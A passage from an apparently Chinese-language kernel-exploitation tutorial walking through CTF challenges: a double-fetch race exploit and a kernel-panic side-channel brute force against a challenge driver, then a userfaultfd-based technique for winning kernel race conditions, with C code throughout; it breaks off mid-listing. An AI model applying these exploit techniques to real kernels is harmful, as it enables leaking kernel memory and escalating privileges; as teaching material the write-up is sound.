<h4 id="利用思路-30"><a href="#利用思路-30" class="headerlink" title="利用思路"></a>利用思路</h4><p>虽然 flag 存储的地址已知，但是位于内核地址空间当中，我们将之直接传给模块并不能通过验证，那么这里就考虑 double  fetch——先传入一个用户地址空间上的合法地址，开另一个线程进行竞争不断修改其为内核空间 flag 的地址，只要有一次命中我们便能获得 flag。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/GOSsNPkuMZHlUmT-1734073220227-1.png"
                      alt="img"
                ></p>
<h4 id="exp-29"><a href="#exp-29" class="headerlink" title="exp"></a>exp</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> compete_thread;</span><br><span class="line"><span class="type">void</span> * real_addr;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x20</span>] = <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line"><span class="type">int</span> competetion_times = <span class="number">0x1000</span>, status = <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> * flag_addr;</span><br><span class="line">    <span class="type">int</span> flag_len;</span><br><span class="line">&#125;flag = &#123;.flag_addr = buf, .flag_len = <span class="number">33</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">competetionThread</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (status)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; competetion_times; i++)</span><br><span class="line">            flag.flag_addr = real_addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd, result_fd, addr_fd;</span><br><span class="line">    <span class="type">char</span> * temp, *flag_addr_addr;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag &gt; addr.txt&quot;</span>);</span><br><span class="line">    temp = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">0x1000</span>);    </span><br><span class="line">    addr_fd = open(<span class="string">&quot;./addr.txt&quot;</span>, O_RDONLY);</span><br><span class="line">    temp[read(addr_fd, temp, <span class="number">0x100</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    flag_addr_addr = <span class="built_in">strstr</span>(temp, <span class="string">&quot;Your flag is at &quot;</span>) + <span class="built_in">strlen</span>(<span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    real_addr = strtoull(flag_addr_addr, flag_addr_addr + <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] flag addr: %llx&quot;</span>, real_addr);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;compete_thread, <span class="literal">NULL</span>, competetionThread, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">while</span> (status)</span><br><span class="line">    &#123;    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; competetion_times; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            flag.flag_addr = buf;</span><br><span class="line">            ioctl(fd, <span class="number">0x1337</span>, &amp;flag);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">&quot;dmesg | grep flag &gt; result.txt&quot;</span>);</span><br><span class="line">        result_fd = open(<span class="string">&quot;./result.txt&quot;</span>, O_RDONLY);</span><br><span class="line">        read(result_fd, temp, <span class="number">0x1000</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(temp, <span class="string">&quot;flag&#123;&quot;</span>))</span><br><span class="line">            status = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_cancel(compete_thread);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] competetion end!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="侧信道攻击"><a href="#侧信道攻击" class="headerlink" title="侧信道攻击"></a>侧信道攻击</h3><h4 id="利用思路-31"><a href="#利用思路-31" class="headerlink" title="利用思路"></a>利用思路</h4><p>在进行比对时并没有检验 flag 地址的合法性，考虑如下内存布局：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|                              |    &lt;---- unallocated page</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|------------------------------|</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|                              |    &lt;---- page alloc by mmap</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|                     flag&#123;...X|</span></span><br><span class="line"><span class="comment">|------------------------------|</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|                              |    &lt;---- unallocated page</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<p>我们将 flag 放在通过 mmap 分配而来的内存页的末尾，其最后一个字符 <code>X</code> 是我们将要爆破的未知字符</p>
<p>对于待比对字符 <code>X</code> 而言，若是比对失败则 ioctl 会直接返回，若是比对成功则指针移动到下一张内存页中进行解引用，<strong>此时将会直接造成 kernel panic</strong></p>
<p>由于 flag 被硬编码在 <code>.ko</code> 文件中，故通过是否造成 kernel panic 可以逐字符爆破 flag 内容</p>
<p>ASCII 可见字符 95 个，flag 长度 33，开头 <code>flag&#123;</code> 末尾 <code>&#125;</code> 减去6个字符，最多只需要爆破 <strong>26 * 95 &#x3D;  2470</strong> 次便能够获得 flag</p>
<p>比较需要耐心（因为打远程传文件很麻烦），这里附上一个比较方便的 exp，不用每次打都重新编译一次，只需要将 flag 作为参数传进去就行了：</p>
<h4 id="exp-30"><a href="#exp-30" class="headerlink" title="exp"></a>exp</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> * flag_addr;</span><br><span class="line">    <span class="type">int</span> flag_len;</span><br><span class="line">&#125;flag = &#123; .flag_len = <span class="number">33</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd, flag_len;</span><br><span class="line">    <span class="type">char</span> * buf, *flag_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./exp flag&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    flag_len = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    buf = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    flag_addr = buf + <span class="number">0x1000</span> - flag_len;</span><br><span class="line">    <span class="built_in">memcpy</span>(flag_addr, argv[<span class="number">1</span>], flag_len);</span><br><span class="line">    flag.flag_addr = flag_addr;</span><br><span class="line">    ioctl(fd, <span class="number">0x1337</span>, &amp;flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h2><h3 id="利用思路-32"><a href="#利用思路-32" class="headerlink" title="利用思路"></a>利用思路</h3><p>严格意义而言 userfaultfd 并非是一种利用手法，<strong>而是 Linux 的一个系统调用</strong>，简单来说，通过 userfaultfd 这种机制，<strong>用户可以通过自定义的 page fault handler 在用户态处理缺页异常</strong></p>
<p>下面的这张图很好地体现了 userfaultfd 的整个流程：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/i4C7oOvHdG2RqUm.png"
                      alt="i4C7oOvHdG2RqUm"
                ></p>
<p>要使用 userfaultfd 系统调用，我们首先要注册一个 userfaultfd，通过 ioctl 监视一块内存区域，同时还需要专门启动一个用以进行轮询的线程 <code>uffd monitor</code>，该线程会通过 <code>poll()</code> 函数不断轮询<strong>直到出现缺页异常</strong></p>
<ul>
<li>当有一个线程在这块内存区域内触发缺页异常时（比如说第一次访问一个匿名页），该线程（称之为 faulting 线程）进入到内核中处理缺页异常</li>
<li>内核会调用 <code>handle_userfault()</code> 交由 userfaultfd 处理</li>
<li>随后 faulting 线程进入堵塞状态，同时将一个 <code>uffd_msg</code> 发送给 monitor 线程，等待其处理结束</li>
<li>monitor 线程调用通过 ioctl 处理缺页异常，有如下选项：<ul>
<li><code>UFFDIO_COPY</code>：将用户自定义数据拷贝到 faulting page 上</li>
<li><code>UFFDIO_ZEROPAGE</code> ：将 faulting page 置0</li>
<li><code>UFFDIO_WAKE</code>：用于配合上面两项中 <code>UFFDIO_COPY_MODE_DONTWAKE</code> 和 <code>UFFDIO_ZEROPAGE_MODE_DONTWAKE</code> 模式实现批量填充</li>
</ul>
</li>
<li>在处理结束后 monitor 线程发送信号唤醒 faulting 线程继续工作</li>
</ul>
<p>以上便是 userfaultfd 这个机制的整个流程，该机制最初被设计来用以进行虚拟机&#x2F;进程的迁移等用途，但是<strong>通过这个机制我们可以控制进程执行流程的先后顺序，从而使得对条件竞争的利用成功率大幅提高</strong></p>
<p>考虑在内核模块当中有一个菜单堆的情况，其中的操作都没有加锁，那么便存在条件竞争的可能，考虑如下竞争情况：</p>
<ul>
<li>线程1不断地分配与编辑堆块</li>
<li>线程2不断地释放堆块</li>
</ul>
<p>此时线程1便<strong>有可能编辑到被释放的堆块</strong>，若是此时恰好我们又将这个堆块申请到了合适的位置（比如说 tty_operations），那么我们便可以完成对该堆块的重写，从而进行下一步利用</p>
<p>但是毫无疑问的是，若是直接开两个线程进行竞争，命中的几率是比较低的，我们也很难判断是否命中</p>
<p>但假如线程1使用诸如 <code>copy_from_user</code> 、<code>copy_to_user</code> 等方法在用户空间与内核空间之间拷贝数据，那么我们便可以：</p>
<ul>
<li>先用 mmap 分一块匿名内存，为其注册 userfaultfd，由于我们是使用 mmap 分配的匿名内存，此时该块内存并没有实际分配物理内存页</li>
<li>线程1在内核中在这块内存与内核对象间进行数据拷贝，<strong>在访问注册了 userfaultfd 内存时便会触发缺页异常，陷入阻塞，控制权转交 userfaultfd 的 uffd monitor 线程</strong></li>
<li><strong>在 uffd monitor 线程中我们便能对线程1正在操作的内核对象进行恶意操作</strong>（例如覆写线程1正在读写的内核对象，或是将线程1正在读写的内核对象释放掉后再分配到我们想要的地方）</li>
<li>此时再让线程1继续执行，线程 1 便会<strong>向我们想要写入的目标写入特定数据&#x2F;从我们想要读取的目标读取特定数据</strong>了</li>
</ul>
<p>由此，我们便成功利用 userfaultfd 完成了对条件竞争漏洞的利用，这项技术的存在使得条件竞争的命中率大幅提高</p>
<blockquote>
<p>以下代码参考自 Linux man page，略有改动</p>
</blockquote>
<p>首先定义接下来需要用到的一些数据结构</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> uffd;          <span class="comment">/* userfaultfd file descriptor */</span></span><br><span class="line"><span class="type">char</span> *addr;         <span class="comment">/* Start of region handled by userfaultfd */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> len;  <span class="comment">/* Length of region handled by userfaultfd */</span></span><br><span class="line"><span class="type">pthread_t</span> thr;      <span class="comment">/* ID of thread that handles page faults */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br></pre></td></tr></table></figure></div>

<p>首先通过 userfaultfd 系统调用注册一个 userfaultfd，其中 <code>O_CLOEXEC</code> 和 <code>O_NONBLOCK</code> 和 open 的 flags 相同，笔者个人认为这里可以理解为我们创建了一个虚拟设备 <code>userfault</code></p>
<p>这里用 mmap 分一个匿名页用作后续被监视的区域</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">    errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">uffdio_api.api = UFFD_API;</span><br><span class="line">uffdio_api.features = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">    errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Create a private anonymous mapping. The memory will be</span></span><br><span class="line"><span class="comment">    demand-zero paged--that is, not yet allocated. When we</span></span><br><span class="line"><span class="comment">    actually touch the memory, it will be allocated via</span></span><br><span class="line"><span class="comment">    the userfaultfd. */</span></span><br><span class="line">len = <span class="number">0x1000</span>;</span><br><span class="line">addr = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">    errExit(<span class="string">&quot;mmap&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>为这块内存区域注册 userfaultfd</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/* Register the memory range of the mapping we just created for</span><br><span class="line">    handling by the userfaultfd object. In mode, we request to track</span><br><span class="line">    missing pages (i.e., pages that have not yet been faulted in). */</span><br><span class="line"></span><br><span class="line">uffdio_register.range.start = (unsigned long) addr;</span><br><span class="line">uffdio_register.range.len = len;</span><br><span class="line">uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">if (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == -1)</span><br><span class="line">    errExit(&quot;ioctl-UFFDIO_REGISTER&quot;);</span><br></pre></td></tr></table></figure></div>

<p>启动 monitor 轮询线程，整个 userfaultfd 的启动流程就结束了，接下来便是等待缺页异常的过程</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Create a thread that will process the userfaultfd events */</span><br><span class="line">int s = pthread_create(&amp;thr, NULL, fault_handler_thread, (void *) uffd);</span><br><span class="line">if (s != 0) &#123;</span><br><span class="line">    errExit(&quot;pthread_create&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>monitor 轮询线程应当定义如下形式，这里给出的是 UFFD_COPY，即将自定义数据拷贝到 faulting page 上：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span>   <span class="comment">/* Data read from userfaultfd */</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;     <span class="comment">/* Number of faults so far handled */</span></span><br><span class="line">    <span class="type">long</span> uffd;                    <span class="comment">/* userfaultfd file descriptor */</span></span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create a page that will be copied into the faulting region */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (page == <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        page = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,</span><br><span class="line">                    MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">            errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Loop, handling incoming events on the userfaultfd</span></span><br><span class="line"><span class="comment">        file descriptor */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* See what poll() tells us about the userfaultfd */</span></span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nfault_handler_thread():\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    poll() returns: nready = %d; &quot;</span></span><br><span class="line">                <span class="string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,</span><br><span class="line">                (pollfd.revents &amp; POLLIN) != <span class="number">0</span>,</span><br><span class="line">                (pollfd.revents &amp; POLLERR) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Read an event from the userfaultfd */</span></span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span 